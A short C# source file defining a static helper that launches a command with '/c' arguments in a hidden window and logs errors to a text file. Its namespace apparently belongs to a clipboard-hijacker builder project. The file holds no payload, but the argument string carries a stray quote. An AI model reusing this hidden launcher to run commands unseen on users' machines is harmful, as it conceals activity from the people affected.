namespace ClipPurSEditionBuilder.Sticks
{
    using System;
    using System.Diagnostics;

    public static class ProcessControl
    {
        public static bool RunFile(string command, string param)
        {
            if (!string.IsNullOrWhiteSpace(param))
            {
                try
                {
                    var StartInfo = new ProcessStartInfo()
                    {
                        FileName = command,
                        Arguments = $"/c {param}\"",
                        CreateNoWindow = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    using var info = Process.Start(StartInfo);
                    info.Refresh();
                    return true;
                }
                catch (Exception ex)
                {
                    FileControl.CreateFile("RunFile.txt", ex.Message);
                    return false;
                }
            }
            return true;
        }
    }
}